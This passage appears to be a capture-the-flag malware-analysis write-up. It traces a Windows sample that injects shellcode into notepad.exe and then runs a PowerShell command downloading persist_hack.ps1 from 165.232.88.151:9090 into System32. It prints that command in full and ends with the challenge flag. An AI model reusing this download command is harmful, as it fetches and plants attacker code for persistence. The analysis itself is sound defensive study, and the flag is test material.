after injecting the shellcode into the remote process `notepad.exe` the malware tries to establish an internet connection with the "Mozilla/5.0" user agent using the windows api function `InternetOpenW`. If the connection cannot be established, the function returns `-1` to signal an error.

[![image.png](https://i.postimg.cc/J05bQ8P1/image.png)](https://postimg.cc/xNqJ0Ww7)

and after this it checks the result of calling a function `sub_140002D88` with a `powershell command` as argument

[![image.png](https://i.postimg.cc/TYSPHSFG/image.png)](https://postimg.cc/RN79WPvb)

first let's view the full powershell command by double clicking on the arguement `aPowershellComm` 
[![image.png](https://i.postimg.cc/rmr6sngG/image.png)](https://postimg.cc/xJnpFPwq)

and if we copy its part and put them together we will get this 

```powershell
powershell -command "(New-Object System.Net.WebClient).DownloadFile('http://165.232.88.151:9090/persist_hack.ps1', 'C:\Windows\System32\persist_hack.ps1')"
```

which is a powershell command to download a file called `persist_hack.ps1` from the ip `165.232.88.151` and port `9090` and the outfile will be located in this path `C:\Windows\System32\persist_hack.ps1`

and now we need to know what this function `sub_140002D88` do, let's double click on it to jump to its logic, the code is hard to understand but we can some key instructions like the instruction below that spawns a cmd.exe process and passes the v8 which is an array that holds the powershell command so maybe this function is executing the powershell command on the system

[![image.png](https://i.postimg.cc/XYjkvrxQ/image.png)](https://postimg.cc/BXzKYQrK)

let's ask chatgpt, and it says the same thing

[![image.png](https://i.postimg.cc/zBt9dmv1/image.png)](https://postimg.cc/qhKbR52m)

so we can be sure that the attacker tries to download the file `persist_hack.ps1` from the remote server `165.232.88.151:9090`

## Flag : 

```
DEFENSYS{165.232.88.151:9090_persist_hack.ps1}
```
